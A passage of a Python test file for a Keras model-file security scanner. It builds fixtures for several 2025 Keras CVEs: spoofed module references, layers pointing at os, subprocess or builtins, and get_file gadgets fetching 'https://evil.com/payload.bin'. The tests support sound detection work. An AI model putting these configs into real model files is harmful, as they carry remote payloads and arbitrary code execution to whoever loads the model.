                        "config": {"batch_shape": [None, 32, 32, 3]},
                    },
                    {
                        "class_name": "RandomShear",
                        "name": "random_shear",
                        "config": {"factor": 0.1},
                    },
                    {
                        "class_name": "RandomColorJitter",
                        "name": "random_color_jitter",
                        "config": {"value_range": [0, 255], "brightness_factor": 0.1},
                    },
                ]
            },
            "compile_config": {
                "loss": {"output_1": "mae", "output_2": "mse"},
                "metrics": [["accuracy", "AUC"], [{"class_name": "MeanSquaredError", "config": {}}]],
                "weighted_metrics": {"output_1": ["Precision", "Recall"]},
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="safe_compile.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Metric Detection" for check in result.checks)
        assert all(check.name != "Custom Loss Detection" for check in result.checks)

    def test_registered_builtin_layer_does_not_false_positive(self, tmp_path: Path) -> None:
        """Built-in layers with registered_name metadata should remain clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "add_1",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "Add",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="builtin_registered.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_builtin_registered_name_with_non_allowlisted_module_is_flagged(self, tmp_path: Path) -> None:
        """Spoofed built-in registered names must not hide custom modules."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "evil.module",
                        "registered_name": "Add",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="spoofed_builtin_registered.keras"))
        )

        custom_object_checks = [check for check in result.checks if check.name == "Custom Object Detection"]
        assert len(custom_object_checks) == 1
        assert custom_object_checks[0].details["registered_name"] == "Add"

    def test_builtin_registered_name_with_mixed_module_refs_is_flagged(self, tmp_path: Path) -> None:
        """A safe module reference must not suppress a separate unsafe one."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "Add",
                        "config": {"fn_module": "evil.module"},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="mixed_builtin_registered.keras"))
        )

        custom_object_checks = [check for check in result.checks if check.name == "Custom Object Detection"]
        assert len(custom_object_checks) == 1
        assert custom_object_checks[0].details["registered_name"] == "Add"

    def test_builtin_class_with_non_allowlisted_module_and_no_registered_name_is_flagged(self, tmp_path: Path) -> None:
        """Built-in class names must still be flagged when module metadata points outside the allowlist."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Add",
                        "name": "spoofed_add",
                        "module": "evil.module",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="builtin_class_evil_module.keras"))
        )

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)

    def test_allowlisted_module_layer_does_not_false_positive(self, tmp_path: Path) -> None:
        """Layers from allowlisted Keras modules should not be treated as custom objects."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "NotEqual",
                        "name": "not_equal",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "NotEqual",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_module.keras")))

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_allowlisted_registered_object_without_module_does_not_false_positive_custom_object(
        self, tmp_path: Path
    ) -> None:
        """Allowlisted registered objects should not need module metadata to suppress custom-object warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "NotEqual",
                        "name": "not_equal",
                        "registered_name": "NotEqual",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(
            str(create_configured_keras_zip(tmp_path, config, file_name="allowlisted_registered_without_module.keras"))
        )

        assert all(check.name != "Custom Layer Class Detection" for check in result.checks)
        assert all(check.name != "Custom Object Detection" for check in result.checks)

    def test_allowlisted_module_does_not_suppress_unknown_custom_layer(self, tmp_path: Path) -> None:
        """Unknown classes must still be flagged even if module metadata looks Keras-owned."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "EvilLayer",
                        "name": "evil_layer",
                        "module": "keras.src.ops.numpy",
                        "registered_name": "EvilLayer",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="evil_allowlisted.keras")))

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)
        assert any(check.name == "Custom Object Detection" for check in result.checks)

    def test_generic_base_layer_class_still_flags_custom_layer(self, tmp_path: Path) -> None:
        """The abstract Keras base Layer export should not suppress custom-layer review."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "InputLayer",
                        "name": "input_1",
                        "config": {"batch_shape": [None, 4]},
                    },
                    {
                        "class_name": "Layer",
                        "name": "generic_layer",
                        "module": "keras.layers",
                        "config": {},
                    },
                ]
            },
        }

        result = scanner.scan(str(create_configured_keras_zip(tmp_path, config, file_name="generic_layer.keras")))

        assert any(check.name == "Custom Layer Class Detection" for check in result.checks)


class TestCVE202549655TorchModuleWrapper:
    """Test CVE-2025-49655: TorchModuleWrapper deserialization RCE detection."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with the given config.json."""
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.11.0"}))
        return str(keras_path)

    def _make_keras_zip_with_version(self, config: dict[str, Any], tmp_path: Path, keras_version: str) -> str:
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
        return str(keras_path)

    def test_torch_module_wrapper_detected_critical(self, tmp_path: Path) -> None:
        """TorchModuleWrapper layer should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "torch_wrapper_1",
                        "config": {"module": "my_torch_module"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1, "Should detect TorchModuleWrapper as CVE-2025-49655"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_torch_module_wrapper_attribution_details(self, tmp_path: Path) -> None:
        """CVE attribution details should be present."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "wrapper",
                        "config": {},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-49655"
        assert details["cvss"] == 9.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]
        assert "3.11.3" in details["remediation"]

    def test_no_false_positive_dense_layer(self, tmp_path: Path) -> None:
        """Dense layers should NOT trigger CVE-2025-49655."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) == 0, "Dense layer should not trigger CVE-2025-49655"

    def test_nested_torch_module_wrapper(self, tmp_path: Path) -> None:
        """TorchModuleWrapper in nested model should still be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "TorchModuleWrapper",
                                    "name": "nested_wrapper",
                                    "config": {},
                                }
                            ]
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1, "Should detect TorchModuleWrapper in nested model"

    def test_no_cve_for_fixed_keras_version(self, tmp_path: Path) -> None:
        """Keras >=3.11.3 should not be CVE-attributed for TorchModuleWrapper."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "TorchModuleWrapper",
                        "name": "torch_wrapper_1",
                        "config": {"module": "my_torch_module"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, "3.11.3"))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) == 0, "Fixed Keras versions should not get CVE-2025-49655 attribution"
        risk_checks = [c for c in result.checks if c.name == "TorchModuleWrapper Version Risk Check"]
        assert len(risk_checks) >= 1
        assert risk_checks[0].severity == IssueSeverity.WARNING

    def test_two_part_version_is_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """Keras 3.11 should be interpreted as vulnerable (patch=0)."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }
        result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, "3.11"))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_prerelease_versions_treated_as_vulnerable(self, tmp_path: Path) -> None:
        """PEP 440 prerelease/dev versions in vulnerable 3.11.x range should be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }

        for prerelease_version in ["3.11.0a0", "3.11.1rc1", "3.11.2.dev0"]:
            result = scanner.scan(self._make_keras_zip_with_version(config, tmp_path, prerelease_version))
            cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-49655"]
            assert len(cve_issues) >= 1, f"Prerelease {prerelease_version} should be treated as vulnerable"
            assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_torch_module_wrapper_version_unknown(self, tmp_path: Path) -> None:
        """Missing or non-canonical version should emit warning, not pass."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "TorchModuleWrapper", "name": "wrapper", "config": {}}]},
        }
        keras_path = tmp_path / "unknown_version.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({}))  # No keras_version

        result = scanner.scan(str(keras_path))
        warning_checks = [c for c in result.checks if "Version Unknown" in c.name]
        assert len(warning_checks) >= 1
        assert warning_checks[0].severity == IssueSeverity.WARNING


class TestCVE20251550ModuleReferences:
    """Test CVE-2025-1550: Keras safe_mode bypass via arbitrary module references in config.json."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with the given config.json."""
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
        return str(keras_path)

    def test_dangerous_module_os_in_layer(self, tmp_path: Path) -> None:
        """A layer referencing 'os' module should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "os",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous 'os' module reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_dangerous_module_subprocess_in_fn_module(self, tmp_path: Path) -> None:
        """A layer with fn_module='subprocess' should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Functional",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10, "fn_module": "subprocess"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous 'subprocess' fn_module reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_dangerous_module_builtins_dotpath(self, tmp_path: Path) -> None:
        """A layer referencing 'builtins.eval' should be flagged as CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "evil_dense",
                        "module": "builtins",
                        "config": {"units": 1},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert "builtins" in cve_issues[0].message

    def test_untrusted_module_custom_package(self, tmp_path: Path) -> None:
        """Unknown module references in callable context should be flagged as WARNING."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "fn_module": "my_custom_package.layers",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should flag non-allowlisted module"
        assert cve_issues[0].severity == IssueSeverity.WARNING

    def test_safe_keras_module_no_false_positive(self, tmp_path: Path) -> None:
        """A layer referencing 'keras.layers' should NOT be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Safe keras.layers module should not be flagged"

    def test_safe_tensorflow_module_no_false_positive(self, tmp_path: Path) -> None:
        """A layer referencing 'tensorflow.keras.layers' should NOT be flagged."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "tensorflow.keras.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Safe tensorflow module should not be flagged"

    def test_nested_model_module_reference(self, tmp_path: Path) -> None:
        """Dangerous module in nested model layer should be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [
                    {
                        "class_name": "Model",
                        "name": "submodel",
                        "config": {
                            "layers": [
                                {
                                    "class_name": "Dense",
                                    "name": "nested_evil",
                                    "module": "shutil",
                                    "config": {"units": 1},
                                }
                            ]
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "Should detect dangerous module in nested model"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE-2025-1550 details should be present in issue details."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "os",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-1550"
        assert details["cvss"] == 9.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]

    def test_none_module_value_not_flagged(self, tmp_path: Path) -> None:
        """Layer with module=None should not trigger CVE-2025-1550."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": None,
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "None module should not trigger CVE"

    def test_non_callable_layer_unknown_module_not_flagged(self, tmp_path: Path) -> None:
        """Unknown module on non-callable layers should not produce noisy CVE warnings."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "my_custom_package.layers",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) == 0, "Non-callable layer module should not trigger CVE-2025-1550 warning"

    def test_prefix_collision_module_is_not_allowlisted(self, tmp_path: Path) -> None:
        """Module like 'mathutils.payload' should NOT be treated as safe 'math'."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "lambda_1",
                        "config": {
                            "fn_module": "mathutils.payload",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-1550"]
        assert len(cve_issues) >= 1, "mathutils should not match safe 'math' prefix"
        assert cve_issues[0].severity == IssueSeverity.WARNING


class TestCVE20258747GetFileGadget:
    """Test CVE-2025-8747: keras.utils.get_file gadget bypass detection."""

    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with raw config string."""
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", config_str)
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.5.0"}))
        return str(keras_path)

    def test_get_file_with_url_detected(self, tmp_path: Path) -> None:
        """Config referencing get_file with URL should be CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.utils",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.com/payload.bin",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_with_url_in_args_list_detected(self, tmp_path: Path) -> None:
        """Config with URL inside args list should also be detected."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "args": ["https://evil.com/payload.bin"],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL in args list as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_with_url_in_nested_kwargs_detected(self, tmp_path: Path) -> None:
        """Nested kwargs URL should still be attributed to the get_file invocation."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "kwargs": {"url": "https://evil.com/payload.bin"},
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL in nested kwargs as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_with_nested_metadata_url_not_flagged(self, tmp_path: Path) -> None:
        """Nested metadata URLs in the same node should not be treated as get_file arguments."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "metadata": {"homepage": "https://example.com/model-docs"},
                            "path": "/local/file.h5",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == [], "Nested metadata URLs should not trigger CVE-2025-8747"

    def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
        """Embedded comment tokens in URL strings should not suppress detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.com/payload.bin#comment-token",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["cve_id"] == "CVE-2025-8747"

    def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
        """Config with get_file but no URL should NOT trigger."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"fn": "get_file", "path": "/local/file.h5"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0, "get_file without URL should not trigger"

    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
        """Normal config should not trigger CVE-2025-8747."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0

    def test_get_file_and_url_in_different_contexts_not_flagged(self, tmp_path: Path) -> None:
        """Keyword co-occurrence across unrelated dicts should not trigger CVE."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [{"class_name": "Dense", "name": "dense_1", "config": {"fn": "get_file"}}],
                "metadata": {"download_url": "https://example.com/model-info"},
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0, "get_file and URL in unrelated contexts should not trigger CVE-2025-8747"

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE details should be in issue details."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "d",
                            "config": {
                                "fn": "get_file",
                                "url": "http://evil.com/x",
                            },
                        }
                    ]
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-8747"
        assert details["cvss"] == 8.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]
        assert "3.11.0" in details["remediation"]


class TestCVE20259906UnsafeDeserialization:
    """Test CVE-2025-9906: enable_unsafe_deserialization config bypass detection."""

    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with raw config string."""
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", config_str)
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))
        return str(keras_path)

    def test_enable_unsafe_deserialization_detected(self, tmp_path: Path) -> None:
        """Config referencing enable_unsafe_deserialization should be CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.config",
                        "config": {
                            "fn": "enable_unsafe_deserialization",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1, "Should detect enable_unsafe_deserialization reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
        assert len(cve_checks) >= 1
        assert any(c.status != CheckStatus.PASSED for c in cve_checks)

    def test_enable_unsafe_deserialization_in_nested_value(self, tmp_path: Path) -> None:
        """enable_unsafe_deserialization anywhere in config should be detected."""
        scanner = KerasZipScanner()
        # Embed the string in a deeply nested config value
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [],
                    "metadata": {"loader": "keras.config.enable_unsafe_deserialization"},
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
        assert len(cve_checks) >= 1
        assert any(c.status != CheckStatus.PASSED for c in cve_checks)

    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
        """Normal config without enable_unsafe_deserialization should be clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0, "Normal config should not trigger CVE-2025-9906"

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE details should be present in issue details."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "d",
                            "module": "keras.config",
                            "config": {"fn": "enable_unsafe_deserialization"},
                        }
                    ]
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-9906"
        assert details["cwe"] == "CWE-502"
        assert details["cvss"] == 8.6
        assert details["description"]
        assert details["config_path"] == "config.json"
        assert details["matched_symbol"] == "enable_unsafe_deserialization"
        assert details["detection_method"] in {"structured_config_scan", "raw_config_scan"}

    def test_plain_text_mention_without_keras_context_not_flagged(self, tmp_path: Path) -> None:
        """A plain text mention should not trigger when no keras.config context exists."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
